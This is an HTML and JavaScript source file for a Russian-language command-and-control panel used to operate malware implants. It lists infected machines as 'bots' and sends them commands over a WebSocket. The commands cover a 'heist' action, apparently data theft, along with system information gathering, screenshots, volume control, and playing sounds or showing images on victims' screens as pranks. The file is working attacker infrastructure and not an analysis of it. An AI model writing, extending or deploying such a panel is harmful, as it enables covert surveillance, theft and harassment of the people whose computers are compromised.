<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>C2 Control Panel</title>
    <style>
        body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; }
        .main-content { flex-grow: 1; display: flex; flex-direction: column; }
        .controls-panel { padding: 20px; border-bottom: 1px solid #444; }
        .media-panel { padding: 20px; flex-grow: 1; }
        #bot-list { list-style: none; padding: 0; }
        #bot-list li { padding: 8px; cursor: pointer; border-radius: 4px; margin-bottom: 5px; }
        #bot-list li:hover { background-color: #444; }
        #bot-list li.selected { background-color: #5a5a5a; font-weight: bold; }
        .log-panel { height: 150px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; }
        #log-output { white-space: pre-wrap; }
        button { background-color: #4CAF50; border: none; color: white; padding: 10px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 14px; margin: 4px 2px; cursor: pointer; border-radius: 5px; }
        button.action { background-color: #f44336; }
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
        .file-grid button { width: 100%; background-color: #008CBA; }
        .log-error { color: #ff5555; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h3>Боты онлайн:</h3>
        <ul id="bot-list"></ul>
    </div>

    <div class="main-content">
        <div class="controls-panel">
            <h3>Управление: <span id="selected-bot-name">...</span></h3>
            <div>
                <h4>Системные действия</h4>
                <button class="action" onclick="runHeist()">Начать HEIST</button>
                <button class="action" onclick="runSysInfo()">Системная информация</button>
                <button class="action" onclick="runScreenshot()">Скриншот</button>
            </div>
            <div>
                <h4>Управление звуком</h4>
                <input type="range" min="0" max="100" value="50" id="volume-slider" onchange="setVolume(this.value)">
                <button onclick="toggleMute()">Вкл/Выкл Звук</button>
            </div>
        </div>

        <div class="media-panel">
            <h3>Пранки и Медиа</h3>
            <h4>Локальные звуки</h4>
            <div id="audio-files" class="file-grid"></div>
            <h4>Локальные изображения</h4>
            <div id="image-files" class="file-grid"></div>
        </div>

        <div class="log-panel">
            <h4>Лог:</h4>
            <div id="log-output"></div>
        </div>
    </div>

    <script>
        let ws;
        let selectedBot = null;
        const botList = document.getElementById('bot-list');
        const selectedBotName = document.getElementById('selected-bot-name');
        const logOutput = document.getElementById('log-output');

        function log(message, isError = false) {
            const entry = document.createElement('div');
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            if (isError) {
                entry.className = 'log-error';
            }
            logOutput.prepend(entry);
        }

        function connectWs() {
            log("Подключение к C2...");
            ws = new WebSocket(`wss://${window.location.host}/ws`);

            ws.onopen = () => {
                log("Соединение с C2 установлено.");
                ws.send(JSON.stringify({ type: 'operator' }));
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                switch (data.type) {
                    case 'bot_list':
                        updateBotList(data.data);
                        break;
                    case 'bot_details':
                        displayBotDetails(data.bot_id, data.data);
                        break;
                    case 'status':
                        const isError = data.data.startsWith('❌');
                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, isError);
                        break;               }
            };

            ws.onclose = () => {
                log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true);
                setTimeout(connectWs, 5000);
            };

            ws.onerror = () => {
                log("Ошибка WebSocket.", true);
            };
        }

        function updateBotList(bots) {
            botList.innerHTML = '';
            bots.forEach(botId => {
                const li = document.createElement('li');
                li.textContent = botId.replace('implant_', '');
                li.dataset.botId = botId;
                if (botId === selectedBot) {
                    li.classList.add('selected');
                }
                li.onclick = () => selectBot(botId, li);
                botList.appendChild(li);
            });
        }

        function selectBot(botId, element) {
            if (selectedBot) {
                const oldSelected = botList.querySelector(`[data-bot-id="${selectedBot}"]`);
                if(oldSelected) oldSelected.classList.remove('selected');
            }
            selectedBot = botId;
            element.classList.add('selected');
            selectedBotName.textContent = botId.replace('implant_', '');
            log(`Выбран бот: ${selectedBot}`);
            ws.send(JSON.stringify({ type: 'get_details', target_id: selectedBot }));
        }

        function displayBotDetails(botId, details) {
            if(botId !== selectedBot) return;
            if (details.volume) {
                document.getElementById('volume-slider').value = details.volume;
            }
            if (details.files) {
                displayFiles(details.files);
            }
        }

        function displayFiles(files) {
            const audioContainer = document.getElementById('audio-files');
            const imageContainer = document.getElementById('image-files');
            audioContainer.innerHTML = '';    imageContainer.innerHTML = '';

            if (files && files.audio) {
                files.audio.forEach(filename => {
                    const button = document.createElement('button');
                    button.textContent = filename;
                    button.onclick = () => playSound(filename);
                    audioContainer.appendChild(button);
                });
            }
            if (files && files.image) {
                files.image.forEach(image => {
                    const button = document.createElement('button');
                    button.textContent = image.filename;
                    button.onclick = () => showImage(image.filename);
                    imageContainer.appendChild(button);
                });
            }
        }

        function sendCommand(type, payload) {
             if (!selectedBot) {
                log("Ошибка: бот не выбран!", true);
                return;
            }
            ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload }));
        }

        // --- ФУНКЦИИ УПРАВЛЕНИЯ ---
        function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
        function toggleMute() { sendCommand('command', { action: 'mute' }); }
        function runHeist() { sendCommand('command', { action: 'heist' }); }
        function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
        function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
        function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
        function showImage(filename) { sendCommand('command', 'show', { filename: filename }); }

        // Запуск при загрузке страницы
        document.addEventListener('DOMContentLoaded', connectWs);
    </script>
</body>
</html>
